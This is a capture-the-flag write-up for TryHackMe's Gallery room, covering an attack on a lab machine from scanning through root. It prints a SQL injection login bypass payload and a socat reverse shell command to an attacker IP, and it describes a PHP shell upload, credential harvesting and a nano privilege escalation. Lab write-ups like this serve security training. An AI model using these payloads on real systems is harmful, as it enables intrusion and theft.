# Gallery

Writeup for [Gallery](https://tryhackme.com/room/gallery666) room at [TryHackMe.com](https://tryhackme.com/)
URL for Gallery room is: https://tryhackme.com/room/gallery666

Table of Contents
=================
* [Port Scan](#Port-Scan)
* [Directory Enumeration](#Directory-Enumeration)
* [Webpage](#Webpage)
* [SQL Injection](#SQL-Injection)
	* [Automatic Exploit](#Auotmatic-Exploit)
	* [Manual Exploit](#Manual-Exploit)
* [Reverse Shell](#Reverse-Shell)
	* [Shell Stabilization](#Shell-Stabilization)
* [Database Enumeration](#Database-Enumeration)
* [User Flag](#User-Flag)
* [Privillege Escalation](#Privillege-Escalation)
* [Conclusion](#Conclusion)

# Port Scan

Port scanning using `nmap` revealed that a couple of ports are open.

```
# Nmap 7.92 scan initiated Sun Feb 13 04:47:02 2022 as: nmap -vv -sS -oN enum.txt 10.10.47.6
Nmap scan report for 10.10.47.6
Host is up, received reset ttl 63 (0.064s latency).
Scanned at 2022-02-13 04:47:02 EST for 2s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Feb 13 04:47:04 2022 -- 1 IP address (1 host up) scanned in 1.90 seconds
```

Conducting a more detailed scan on the ports 80 and 8080 revealed the following information.

```
# Nmap 7.92 scan initiated Sun Feb 13 04:47:17 2022 as: nmap -vv -sS -A -p 80,8080 -oN open_ports.txt 10.10.47.6
Nmap scan report for 10.10.47.6
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2022-02-13 04:47:18 EST for 15s

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 20CBC8F4B629DEB39494233A39773553
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=2/13%OT=80%CT=%CU=38878%PV=Y%DS=2%DC=T%G=N%TM=6208D3B5%P=x86_64-pc-linux-gnu)
SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 39.649 days (since Tue Jan  4 13:13:31 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   56.98 ms 10.9.0.1
2   57.74 ms 10.10.47.6

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 13 04:47:33 2022 -- 1 IP address (1 host up) scanned in 16.19 seconds
```

# Directory Enumeration

Directory enumeration using `gobuster` revealed directory named `gallery`, which contains the login page.

![Directory Enumeration](/Gallery/images/Directory_Enumeration.png)

# Webpage

Port 80 redirects to Apache2 Ubuntu default webpage.

![Default Page](/Gallery/images/Default_Page.png)

Port 8080 redirects to the actual website of the gallery.

![Webpage](/Gallery/images/Webpage.png)

The webpage has a login form, which might be vulnerable to SQL Injection.

Also, it is possible to figure out the name of CMS here ;)

# SQL Injection

## Automatic Exploit

Searching for exploits for this particular CMS, I found a [Python script for Remote Code Execution](https://www.exploit-db.com/exploits/50214) on Exploit.db.

Running the exploit injects an SQL query into username field and uploads a PHP webshell into `uploads` directory.

![Auto Exploit](/Gallery/images/Auto_Exploit.png)

The uploaded webshell accepts system commands.

![Webshell](/Gallery/images/Webshell.png)

Although it is possible to inject a reverse shell here, I will try to analyze the web appliaction first.

## Manual Exploit

I will take the SQLi payload from the downloaded exploit and copy it into username field of the CMS login form.

The SQLi payload for username field is `admin' or '1'='1'#`. The password field is left empty.

![SQLi](/Gallery/images/SQLi.png)

It successfully gives access to the admin panel.

![Admin Panel](/Gallery/images/Admin_Panel.png)

# Reverse Shell

Under Albums page I chose "Sample Images" album and uploaded a PHP reverse shell. No filters for file upload were present.

![Shell Upload](/Gallery/images/Shell_Upload.png)

Then I set up a netcat listener on my host machine.

![Netcat Listener](/Gallery/images/Netcat_Listener.png)

Then open the PHP "image" I have uploaded.

![PHP Image](/Gallery/images/PHP_Image.png)

And now I have a reverse shell.

![Reverse Shell](/Gallery/images/Reverse_Shell.png)

## Shell Stabilization

For stabilizing the shell, I uploaded the static binary of `socat` utility to the target machine.

I downloaded socat binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat).

On the host machine, I started a Python server within the directory containing socat.

![Python Server](/Gallery/images/Python_Server.png)

On the target machine, I headed to `/var/www/html` directory and downloaded the socat binary using `wget`.

![Socat Binary](/Gallery/images/Socat_Binary.png)

On host machine, I started the socat listener.

![Socat Listener](/Gallery/images/Socat_Listener.png)

Lastly, I issued a `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.9.47:4444` command on the victim and got a socat reverse shell on the host machine.

![Socat Shell](/Gallery/images/Socat_Shell.png)

# Database Enumeration

Inside the webserver's `/var/www/html` directory there is a file containing mysql database credentials.

![Database Credentials](/Gallery/images/Database_Credentials.png)

Within the connected database, administrator's password hash could be found.

![Admin Hash](/Gallery/images/Admin_Hash.png)

# User Flag

Exploring directories on the target machine, backups for user `mike` can be found. The backups also contains password
for this specific user.

![Mike's Password](/Gallery/images/Mikes_Password.png)

Now it is possible to switch to the user `mike`. Heading to the `/home/mike` directory and reading `user.txt` file gave
the user flag.

![User Flag](/Gallery/images/User_Flag.png)

# Privillege Escalation

Issuing `sudo -l` command showed that mike could run `/bin/bash` and `/opt/rootkit.sh` commands as root.

Although trying these commands on my socat shell gave error opening terminal.

![Socat Error](/Gallery/images/Socat_Error.png)

It seems that the terminal emulator variable `TERM` is set as `dumb` and nano editor does not know how to start on it.

To fix the issue, I can do `export TERM=xterm` to set xterm as a terminal emulator.

![Nano Editor](/Gallery/images/Nano_Editor.png)

Since nano is also being run as root, it is possible to spawn a root shell from the editor. GTFOBins has a solution on
how to do this.

![GTFOBins](/Gallery/images/GTFOBins.png)

This exploit gives me a root shell.

![Root Shell](/Gallery/images/Root_Shell.png)

Going to `/root` directory and reading the `root.txt` file gives the root flag.

![Root Flag](/Gallery/images/Root_Flag.png)

# Conclusion

The summary of my solution of Gallery CTF is as follows:

1. The webserver had 2 open ports, one of them redirected to an image gallery Content Management System.
2. There was a written RCE exploit for this CMS that uses SQLi and uploads a webshell into the server.
3. The web application had a vulnerable image upload function, which allowed to upload PHP files.
4. I uploaded the reverse shell to the webserver, captured it with `netcat` and then upgraded the shell with `socat`.
5. Searching through the `/var/www/html` directory I found a file with mysql database credentials.
6. Connected to this database, I found admin user's password hash.
7. Exploring  directories of the target system I found backups for the user `mike`, which contained the password for mike's account on the system.
7. Switched to user mike and got the user flag.
8. As user mike I exported xterm as terminal emulator and issued `/bin/bash /opt/rootkit.sh` command as root, which
   opened `nano` editor.
9. Found GTFOBins exploit for nano, executing it gave me root shell.
10. Headed to `/root` directory and got the root flag.

Done!
